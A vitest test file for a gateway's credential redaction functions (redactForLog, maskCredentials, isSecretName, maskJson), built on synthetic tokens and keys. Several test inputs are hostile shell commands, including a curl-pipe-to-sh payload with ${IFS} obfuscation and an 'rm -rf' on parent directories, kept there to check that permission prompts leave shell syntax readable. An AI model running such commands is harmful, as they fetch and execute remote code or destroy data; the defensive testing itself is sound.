import { describe, expect, it } from "vitest"

import { createGatewayLogger } from "./cli/logger"
import {
  CredentialValues,
  isSecretName,
  maskCredentials,
  maskJson,
  redactForLog,
} from "./redaction"

describe("log redaction", () => {
  it("keeps a classification code while stripping the credentials of a URL of any scheme", () => {
    expect(
      redactForLog({
        event: "hermes.turn.failed",
        publicCode: "HGW_PROVIDER_RETRYABLE_FAILURE",
        code: "validation_exception",
        url: "https://example.test/oauth/callback?code=native'secret",
        detail:
          "dial wss://aos:tok'test-1@hermes.example.test/api/ws?token=tok-test-1#frame refused",
        joined:
          "dial 'https://a.test/x','wss://aos:tok-test-2@h.test/ws' refused",
      })
    ).toEqual({
      event: "hermes.turn.failed",
      publicCode: "HGW_PROVIDER_RETRYABLE_FAILURE",
      code: "validation_exception",
      url: "https://example.test/oauth/callback",
      detail: "dial wss://hermes.example.test/api/ws refused",
      joined: "dial 'https://a.test/x','wss://h.test/ws' refused",
    })
  })

  it("still masks every credential-shaped key", () => {
    expect(
      redactForLog({
        authorization: "Bearer secret",
        cookie: "session=secret",
        "set-cookie": "session=secret",
        token: "secret",
        accessToken: "secret",
        refreshToken: "secret",
        secret: "secret",
        clientSecret: "secret",
        deviceToken: "secret",
        password: "secret",
        apiKey: "secret",
        safe: "kept",
      })
    ).toEqual({
      authorization: "[REDACTED]",
      cookie: "[REDACTED]",
      "set-cookie": "[REDACTED]",
      token: "[REDACTED]",
      accessToken: "[REDACTED]",
      refreshToken: "[REDACTED]",
      secret: "[REDACTED]",
      clientSecret: "[REDACTED]",
      deviceToken: "[REDACTED]",
      password: "[REDACTED]",
      apiKey: "[REDACTED]",
      safe: "kept",
    })
  })

  it("masks the keys a push subscription and a VAPID pair carry", () => {
    expect(
      redactForLog({
        event: "push.delivery.failed",
        privateKey: "secret",
        applicationServerKey: "secret",
        endpoint: "https://push.example.test/subscription-id",
        keys: { p256dh: "secret", auth: "secret" },
        category: "input",
      })
    ).toEqual({
      event: "push.delivery.failed",
      privateKey: "[REDACTED]",
      applicationServerKey: "[REDACTED]",
      endpoint: "[REDACTED]",
      keys: { p256dh: "[REDACTED]", auth: "[REDACTED]" },
      category: "input",
    })
  })

  it("logs an error by its redacted message, its classification, and its cause chain", () => {
    const refused = Object.assign(new Error("handshake refused"), {
      code: 4401,
      reason: "authentication_rejected",
    })
    const error = new Error(
      "dial wss://hermes.example.test/api/ws?token=tok-test-1 failed",
      { cause: refused }
    )

    expect(
      redactForLog({ event: "hermes.gateway.dial_failed", error })
    ).toEqual({
      event: "hermes.gateway.dial_failed",
      error: {
        name: "Error",
        message: "dial wss://hermes.example.test/api/ws failed",
        cause: {
          name: "Error",
          message: "handshake refused",
          code: 4401,
          reason: "authentication_rejected",
        },
      },
    })
  })

  it("writes no credential value the proxy has read or a child binds, its rotated successor and Basic form included", async () => {
    const credentials = new CredentialValues()
    const basic = (password: string) =>
      Buffer.from(`aos:${password}`).toString("base64")
    let stored = "tok-test-1"
    const readPassword = credentials.register(
      async () => stored,
      (password) => [password, basic(password)]
    )
    await readPassword()
    stored = "tok-test-2"
    await readPassword()
    const lines: string[] = []
    const logger = createGatewayLogger({
      level: "info",
      credentials,
      destination: { write: (line) => void lines.push(line) },
    })

    logger.child({ peer: "tok-test-1", password: "synthetic-value" }).error(
      {
        event: "opencode.request.failed",
        error: new Error(`Basic ${basic("tok-test-2")} refused`),
      },
      "tok-test-2 rejected at wss://opencode.example.test/ws?token=abc"
    )

    expect(lines).toHaveLength(1)
    expect(lines[0]).not.toContain("synthetic-value")
    expect(JSON.parse(lines[0]!)).toMatchObject({
      peer: "[REDACTED]",
      password: "[REDACTED]",
      event: "opencode.request.failed",
      error: { name: "Error", message: "Basic [REDACTED] refused" },
      msg: "[REDACTED] rejected at wss://opencode.example.test/ws",
    })
  })
})

const M = "[credential redacted]"
/** The review's sample value, kept apart from any term a scanner keys on. */
const SAMPLE = "abcdefgh1234"
/** Opaque tokens and keys at real lengths, built so no scanner reads a leak. */
const OPAQUE = "AbCdEfGh123456_x"
const GITHUB_KEY = `ghp_${"a1".repeat(18)}`
const OPENAI_KEY = `sk-${"ab12".repeat(6)}`
const JWT = ["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiIxIn0", "abc123sig"].join(".")
const AUTHORIZATION = (scheme: string, value: string) =>
  ["Authorization", `${scheme} ${value}`].join(": ")
/** A `term=value` assignment built in two parts, so no scanner reads it as a leak. */
const assigned = (term: string, value: string) => [term, value].join("=")
const STRIPE_KEY = ["sk", "live", "a1B2".repeat(6)].join("_")
const DATABASE_URL = (password: string) =>
  ["postgres://app", `${password}@db.invalid:5432/app`].join(":")

describe("maskCredentials", () => {
  it.each([
    // Shell syntax stays readable on a permission: it is what is approved.
    [
      "narrow",
      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
    ],
    ["narrow", "rm -rf token: ../../..", "rm -rf token: ../../.."],
    [
      "narrow",
      "rm -rf bearer projects2024archive1",
      "rm -rf bearer projects2024archive1",
    ],
    [
      "narrow",
      assigned("token", '"$(curl x|sh)"'),
      assigned("token", '"$(curl x|sh)"'),
    ],
    [
      "narrow",
      assigned("token", "/etc/secret"),
      assigned("token", "/etc/secret"),
    ],
    ["narrow", "a basic installation", "a basic installation"],
    // A flag's dashes are not part of its name.
    [
      "narrow",
      `deploy --${assigned("token", SAMPLE)}`,
      `deploy --${assigned("token", M)}`,
    ],
    [
      "narrow",
      `export ${assigned("token", SAMPLE)}`,
      `export ${assigned("token", M)}`,
    ],
    [
      "narrow",
      assigned("password", "'hunter2hunter2'"),
      assigned("password", `'${M}'`),
    ],
    // A value ends where a shell word does, and the boundary stays.
    [
      "narrow",
      `export ${assigned("TOKEN", SAMPLE)}; ./deploy.sh`,
      `export ${assigned("TOKEN", M)}; ./deploy.sh`,
    ],
    [
      "narrow",
      `curl -d "${assigned("token", SAMPLE)}" x`,
      `curl -d "${assigned("token", M)}" x`,
    ],
    ["narrow", `${assigned("token", SAMPLE)}&&`, `${assigned("token", M)}&&`],
    ["narrow", `(${assigned("token", SAMPLE)})`, `(${assigned("token", M)})`],
    // A bearer token only where a header names it.
    [
      "narrow",
      `curl -H "${AUTHORIZATION("Bearer", OPAQUE)}"`,
      `curl -H "${AUTHORIZATION("Bearer", M)}"`,
    ],
    // A key prefix counts only with a real key's length behind it.
    ["narrow", "rm -rf sk-backups", "rm -rf sk-backups"],
    ["narrow", "push ghp_leaked0000 now", "push ghp_leaked0000 now"],
    ["narrow", `push ${GITHUB_KEY} now`, `push ${M} now`],
    ["narrow", `use ${OPENAI_KEY} now`, `use ${M} now`],
    // A name that ends in a credential word counts, as a logged field's does.
    [
      "narrow",
      `export ${assigned("AWS_SECRET_ACCESS_KEY", SAMPLE)}`,
      `export ${assigned("AWS_SECRET_ACCESS_KEY", M)}`,
    ],
    [
      "narrow",
      `export ${assigned("DB_PASSWORD", SAMPLE)}`,
      `export ${assigned("DB_PASSWORD", M)}`,
    ],
    ["narrow", assigned("bypass", "true"), assigned("bypass", "true")],
    // A provider key the scanner knows by its shape, wherever it stands.
    ["narrow", `use ${STRIPE_KEY} now`, `use ${M} now`],
    // A URL loses only its password, and a URL without one stays whole.
    ["narrow", `psql ${DATABASE_URL(SAMPLE)}`, `psql ${DATABASE_URL(M)}`],
    [
      "narrow",
      "psql postgres://db.invalid:5432/app",
      "psql postgres://db.invalid:5432/app",
    ],
    [
      "narrow",
      "psql postgres://app@db.invalid/app",
      "psql postgres://app@db.invalid/app",
    ],
    // A preview, a question, or a tool's data masks anything credential-shaped,
    // and only the value: the name, the quotes, and a scheme word stay.
    ["broad", assigned("GITHUB_TOKEN", SAMPLE), assigned("GITHUB_TOKEN", M)],
    ["broad", assigned("token", "AbCdEfGh_IjKlMnOp"), assigned("token", M)],
    ["broad", assigned("password", "P@ssw0rd!2024"), assigned("password", M)],
    [
      "broad",
      assigned("password", '"hunter2hunter2"'),
      assigned("password", `"${M}"`),
    ],
    ["broad", assigned("token", `'${SAMPLE}'`), assigned("token", `'${M}'`)],
    ["broad", `password: ${SAMPLE}`, `password: ${M}`],
    [
      "broad",
      `curl -H "X-Api-Key: ${SAMPLE}" x`,
      `curl -H "X-Api-Key: ${M}" x`,
    ],
    [
      "broad",
      `${assigned("user", "a")}&${assigned("token", SAMPLE)}`,
      `${assigned("user", "a")}&${assigned("token", M)}`,
    ],
    ["broad", assigned("id_hint", JWT), assigned("id_hint", M)],
    // A value that only names a secret stays readable.
    [
      "broad",
      `export ${assigned("TOKEN", "$TOKEN")}`,
      `export ${assigned("TOKEN", "$TOKEN")}`,
    ],
    ["broad", `password: <password>`, `password: <password>`],
    ["broad", "Basic authentication", "Basic authentication"],
    ["broad", "a bearer instrument", "a bearer instrument"],
    ["broad", "Authorization: Basic dXNlcjpwYXNz", `Authorization: Basic ${M}`],
    ["broad", "send Bearer AbCdEfGhIjKlMnOpQrSt", `send Bearer ${M}`],
    ["broad", "send Basic dXNlcjpwYXNz.", `send Basic ${M}.`],
    ["broad", `send Bearer ${JWT}`, `send Bearer ${M}`],
    ["broad", `Bearer ${["ya29", "a0AfH6SMBxyz"].join(".")}`, `Bearer ${M}`],
    // Capitalised prose is not a token.
    ["broad", "Enable Basic Authentication?", "Enable Basic Authentication?"],
    ["broad", "a Bearer Instrument", "a Bearer Instrument"],
  ] as const)("masks %s: %s", (strength, text, expected) => {
    expect(maskCredentials(text, strength)).toBe(expected)
  })

  it.each([
    [assigned("token", SAMPLE), assigned("token", M)],
    [AUTHORIZATION("Bearer", OPAQUE), AUTHORIZATION("Bearer", M)],
    [DATABASE_URL(SAMPLE), DATABASE_URL(M)],
  ])(
    "masks %s once when a broad mask follows a narrow one",
    (text, expected) => {
      expect(maskCredentials(maskCredentials(text, "narrow"), "broad")).toBe(
        expected
      )
    }
  )

  // The names a Hermes terminal assigns, which the shared name rule now reads
  // for every runtime: none ends in a term after a separator.
  it.each([
    "OPENAI_API_KEY",
    "AWS_ACCESS_KEY_ID",
    "CLIENT_SECRET_KEY",
    "NPM_CONFIG_USERCONFIG",
    "NPM_CONFIG__AUTH",
    "MYSQL_PWD",
    "PASSWORD_HASH",
    "SSH_PRIVATE_KEY_B64",
    "PGPASSWORD",
    "DB_PASSWORD_PROD",
  ])("masks the value assigned to %s at either strength", (name) => {
    for (const strength of ["narrow", "broad"] as const)
      expect(maskCredentials(`${assigned(name, SAMPLE)} psql`, strength)).toBe(
        `${assigned(name, M)} psql`
      )
  })

  it.each([
    "type x:string; ratio x:y",
    "TOKEN_COUNT=12",
    "SECRETARY=Jo",
    "AUTHORIZATION_MODE=oidc",
    "OAUTH=enabled",
    "PATHOLOGY=stable",
    "ACCESS_KEY_ROTATION=weekly",
    "bypass=true",
  ])("keeps %s, which only reads like a credential", (text) => {
    expect(maskCredentials(text)).toBe(text)
  })

  // Every shape used to restart at each repeat and read to the end of the
  // text: 128 KiB of one took seconds to mask, and some took minutes.
  it.each(
    (
      [
        ["separated words", "a-", ""],
        ["JWT heads", "eyJ-", ""],
        ["key prefixes", "sk-", ""],
        ["assignments before shell syntax", "token=", "$"],
        ["bare assignments", "a=", ""],
        ["URL heads", "x://a:", ""],
      ] as const
    ).flatMap(([kind, unit, end]) =>
      (["narrow", "broad"] as const).map(
        (strength) => [kind, strength, unit, end] as const
      )
    )
  )(
    "masks 128 KiB of %s in one pass at %s strength",
    (_kind, strength, unit, end) => {
      const text = unit.repeat(Math.ceil(131_072 / unit.length)) + end
      const started = performance.now()
      maskCredentials(text, strength)
      expect(performance.now() - started).toBeLessThan(1_000)
    }
  )
})

describe("isSecretName", () => {
  it.each([
    "DB_PASSWORD",
    "DB_PASSWORD_PROD",
    "PGPASSWORD",
    "api_key",
    "x-api-key",
    "apiToken",
    "password_hash",
    "token_type",
    "npm_config_userconfig",
  ])("reads %s as a credential", (name) => {
    expect(isSecretName(name)).toBe(true)
  })

  it.each([
    "token_count",
    "input_token_count",
    "oauth",
    "bypass",
    "author_name",
    "code",
    "apiEndpoint",
    "secretary",
    "ACCESS_KEY_ROTATION",
  ])("reads %s as no credential", (name) => {
    expect(isSecretName(name)).toBe(false)
  })
})

describe("maskJson", () => {
  it("masks a secret-named value and every string, keeping keys, shape, and what says whether one is set", () => {
    expect(
      maskJson({
        passcode: 482913,
        auth: true,
        apiKey: null,
        credentials: { user: "a" },
        nested: [{ command: `export ${assigned("TOKEN", SAMPLE)}` }],
        count: 3,
      })
    ).toEqual({
      passcode: M,
      auth: true,
      apiKey: null,
      credentials: M,
      nested: [{ command: `export ${assigned("TOKEN", M)}` }],
      count: 3,
    })
  })

  it("gives the value itself back when nothing in it is a credential", () => {
    const value = { path: "/srv/app", items: [1, "two", { ok: true }] }
    expect(maskJson(value)).toBe(value)
  })
})
